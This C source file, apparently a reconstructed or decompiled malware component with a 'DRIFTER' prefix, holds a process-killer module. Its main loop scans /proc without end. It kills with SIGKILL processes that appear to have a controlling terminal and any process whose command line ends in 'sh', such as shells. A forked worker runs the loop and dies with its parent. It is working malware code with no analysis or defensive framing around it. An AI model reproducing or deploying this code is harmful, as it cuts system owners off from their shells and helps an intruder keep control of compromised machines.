#define _GNU_SOURCE

#include "process.h"

#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

uint32_t g_process_scan_counter;
uint8_t g_pid_bitmap[DRIFTER_PID_BITMAP_BYTES];

void process_init_hook(void)
{

}

void process_fini_hook(void)
{

}

char *string_duplicate(const char *text)
{
    if (text == NULL) {
        return NULL;
    }

    size_t length = strlen(text) + 1;
    char *copy = malloc(length);
    if (copy != NULL) {
        memcpy(copy, text, length);
    }
    return copy;
}

static void string_list_destroy(StringList *list)
{
    if (list == NULL) {
        return;
    }

    for (int32_t i = 0; i < list->count; ++i) {
        free(list->items[i]);
    }
    free(list->items);
    free(list);
}

StringList *string_split(const char *text, const char *delimiters)
{
    if (text == NULL || delimiters == NULL) {
        return NULL;
    }

    StringList *result = calloc(1, sizeof(*result));
    if (result == NULL) {
        return NULL;
    }

    char *tokenization_buffer = string_duplicate(text);
    if (tokenization_buffer == NULL) {
        string_list_destroy(result);
        return NULL;
    }

    char *token = strtok(tokenization_buffer, delimiters);
    if (token == NULL) {
        free(tokenization_buffer);
        return result;
    }

    while (token != NULL) {
        size_t new_count = (size_t)result->count + 1;
        char **new_items = realloc(result->items,
                                   new_count * sizeof(*new_items));
        if (new_items == NULL) {
            free(tokenization_buffer);
            string_list_destroy(result);
            return NULL;
        }
        result->items = new_items;

        char *token_copy = string_duplicate(token);
        result->items[result->count] = token_copy;
        if (token_copy == NULL) {
            free(tokenization_buffer);
            string_list_destroy(result);
            return NULL;
        }
        ++result->count;
        token = strtok(NULL, delimiters);
    }

    free(tokenization_buffer);
    return result;
}

void *memory_find_case_insensitive(const void *haystack, size_t haystack_length,
                                   const void *needle, size_t needle_length)
{
    const uint8_t *haystack_bytes = haystack;
    const uint8_t *needle_bytes = needle;

    if (needle_length > haystack_length || haystack_length == 0) {
        return NULL;
    }

    size_t matched = 0;
    for (size_t i = 0; i < haystack_length; ++i) {
        uint8_t current = haystack_bytes[i];
        if (current >= (uint8_t)'A' && current <= (uint8_t)'Z') {
            current = (uint8_t)(current + 0x20);
        }

        if (needle_bytes[matched] != current) {
            matched = 0;
        } else {
            ++matched;
            if (matched == needle_length) {
                return (void *)(haystack_bytes + i + 1);
            }
        }
    }

    return NULL;
}

static void build_proc_path(char path[32], const char *name,
                            const char *suffix)
{
    path[0] = '\0';
    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, suffix);
}

DIR *process_scan_and_kill(void)
{
    DIR *directory = opendir("/proc/");

    while (directory != NULL) {
        struct dirent *entry;

        while ((entry = readdir(directory)) != NULL) {
            if ((unsigned int)((unsigned char)entry->d_name[0] -
                               (unsigned char)'0') > 9U) {
                continue;
            }

            pid_t pid = (pid_t)atoi(entry->d_name);

            if (pid == getpid() || pid == getppid())
                continue;

            if ((uint32_t)(pid - 1) <= 0x3ffffeU) {
                size_t byte_index = (uint32_t)pid >> 3;
                uint8_t mask = (uint8_t)(1U << ((uint32_t)pid & 7U));
                if ((g_pid_bitmap[byte_index] & mask) != 0) {
                    continue;
                }
                g_pid_bitmap[byte_index] = (uint8_t)(g_pid_bitmap[byte_index] |
                                                     mask);
            }

            char path[32];
            build_proc_path(path, entry->d_name, "/stat");
            int fd = open(path, O_RDONLY);
            if (fd == -1) {
                continue;
            }

            char stat_buffer[256] = {0};
            ssize_t stat_length = read(fd, stat_buffer, 0xff);
            (void)close(fd);
            if (stat_length <= 0) {
                continue;
            }

            char *closing_parenthesis = strrchr(stat_buffer, ')');
            if (closing_parenthesis == NULL) {
                continue;
            }

            unsigned char state = (unsigned char)closing_parenthesis[2];
            if (state == (unsigned char)'D' || state == (unsigned char)'Z') {
                continue;
            }

            if (atoi(closing_parenthesis + 4) <= 2) {
                continue;
            }

            size_t suffix_length = strlen(closing_parenthesis + 4);
            ssize_t start_offset = (ssize_t)stat_length -
                                   (ssize_t)suffix_length;
            if ((ssize_t)suffix_length > start_offset) {
                char *cursor = stat_buffer + start_offset;
                char *end = stat_buffer + suffix_length;
                int spaces = 0;
                bool kill_without_cmdline = false;

                for (;;) {
                    if (*cursor == ' ') {
                        ++spaces;
                        if (spaces == 3) {
                            kill_without_cmdline = atoi(cursor) > 0;
                            break;
                        }
                    }

                    ++cursor;
                    if (cursor == end) {
                        break;
                    }
                }

                if (kill_without_cmdline) {
                    (void)kill(pid, SIGKILL);
                    continue;
                }
            }

            build_proc_path(path, entry->d_name, "/cmdline");
            fd = open(path, O_RDONLY);
            if (fd == -1) {
                continue;
            }

            char command_buffer[256] = {0};
            ssize_t command_length = read(fd, command_buffer, 0xff);
            (void)close(fd);
            if (command_length <= 0) {
                continue;
            }

            if (memory_find_case_insensitive(command_buffer,
                                             (size_t)command_length,
                                             "sh", 3) == NULL) {
                continue;
            }

            (void)kill(pid, SIGKILL);
        }

        (void)closedir(directory);

        ++g_process_scan_counter;
        if (g_process_scan_counter > 9U) {
            memset(g_pid_bitmap, 0, sizeof(g_pid_bitmap));
            g_process_scan_counter = 0;
        }

        usleep(0x186a0);
        directory = opendir("/proc/");
    }

    return directory;
}

pid_t process_launch_worker(void)
{
    pid_t child = fork();
    if (child != 0) {
        return child;
    }

    (void)prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
    (void)process_scan_and_kill();

    exit(0);
}
